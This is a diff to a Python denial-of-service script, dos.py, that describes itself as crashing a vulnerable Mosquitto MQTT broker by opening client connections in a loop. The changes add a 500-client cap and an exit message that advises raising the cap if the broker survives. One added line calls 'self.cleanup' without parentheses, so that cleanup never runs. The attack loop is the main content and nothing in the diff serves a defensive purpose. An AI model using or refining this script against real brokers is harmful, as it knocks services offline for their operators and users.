@@ -9,7 +9,7 @@ dos.py, Crashes a vulnerable mosqsuitto broker
 import paho.mqtt.client as mqtt
 import time
 
-
+MAX_CLIENTS = 500
 class MQTT_DoS:
 
     def __init__(self, hostname, port, credentials):
@@ -47,7 +47,7 @@ class MQTT_DoS:
 
         """ Clean up threads """
         for conn in connections:
-            #Connection thead loop stops automaticly
+            #Connection thead loop stops automaticly if started
             conn.disconnect()
 
     def run(self):
@@ -64,6 +64,11 @@ class MQTT_DoS:
         counter = 0
         try:
             while True:
+                if counter > MAX_CLIENTS:
+                    self.cleanup
+                    print('Max number of clients reached. If broker did not crash try to increase Max_Clients\nExiting')
+                    exit(0)
+
                 # Give unique clientIDs
                 subscriber = mqtt.Client(client_id='Client'+str(counter))
                 subscriber.username_pw_set(user, pw)
